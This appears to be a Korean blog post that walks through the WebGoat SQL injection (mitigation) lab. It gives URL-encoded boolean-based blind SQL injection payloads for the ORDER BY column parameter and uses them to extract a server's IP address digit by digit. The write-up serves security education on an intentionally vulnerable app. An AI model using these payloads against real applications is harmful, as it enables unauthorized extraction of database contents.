---
layout: post
title: WebGoat - SQL Injection (mitigation)
date: 2021-01-12 15:00:00 +0900
category: Web_Hacking
---

# WebGoat - SQL Injection (mitigation)

#### ORDER BY절을 이용하여 SQL Injection을 시도하고, "webgoat-prd" 서버의 IP 주소 알아내기 (IP주소는 xxx.130.219.202)

<br/>

> SQL Injection을 방어하기 위해서는 사용자의 입력값을 항상 의심하고, 악성 행위에 대비할 수 있도록 입력 값을 적절하게 필터링해야 한다.

<br/>

화살표를 누르니 오름차순으로 정렬되는 것을 알 수 있고, 이는 내부에서 ORDER BY 절을 사용하고 있다는 뜻이다. 

Burp Suite를 통해 보면 GET 방식으로 통신하고 column 파라미터를 통해 데이터를 전송하고 있다.

![webgoat_sqli_mit1](/public/img/webgoat_sqli_mit1.PNG)

![webgoat_sqli_mit2](/public/img/webgoat_sqli_mit2.PNG)

<br/>

SQL 문을 다음처럼 예상할 수 있다.

```shell
SELECT ??? from servers WHERE ??? ORDER BY ???
```

<br/>

ORDER BY 절에 들어갈 아래 내용을 columns 파라미터를 이용해 서버로 전송해보자. 여기서 주의해야 할 점은 전송할 때 인코딩을 해주어야 한다는 것이다.

```shell
(case when length('test')=4 then id else hostname end)
(case+when+length('test')%3d4+then+id+else+hostname+end)
```

![webgoat_sqli_mit3](/public/img/webgoat_sqli_mit3.PNG)

![webgoat_sqli_mit4](/public/img/webgoat_sqli_mit4.PNG)

<br/>

내용을 참->거짓으로 변경하면 결과가 다르다는 것을 알 수 있다.

```shell
(case+when+length('test')%3d3+then+id+else+hostname+end)
```

![webgoat_sqli_mit5](/public/img/webgoat_sqli_mit5.PNG)

![webgoat_sqli_mit6](/public/img/webgoat_sqli_mit6.PNG)

<br/>

이러한 점을 이용하여 아래와 같이 내용을 변경해서 정답을 찾아보자.

```shell
(case+when+exists(SELECT+*+FROM+servers+WHERE+hostname%3d'webgoat-prd'+AND+substr(ip,1,1)%3d'1')+then+id+else+hostname+end)
```

<br/>

내용이 참일때의 결과가 나오는 것을 보니 'webgoat-prd'가 존재하고, IP주소의 첫 번째 숫자가 '1'이라는 것을 알 수 있다.

![webgoat_sqli_mit7](/public/img/webgoat_sqli_mit7.PNG)

![webgoat_sqli_mit8](/public/img/webgoat_sqli_mit8.PNG)

<br/>

다음과 같은 방식을 반복하면 두 번째 숫자와 세 번째 숫자는 각각 '0', '4'라는 것을 알 수 있다.

결론적으로 IP주소는 '104.130.219.202' 이고, 입력해보면 성공이다.

![webgoat_sqli_mit9](/public/img/webgoat_sqli_mit9.PNG)

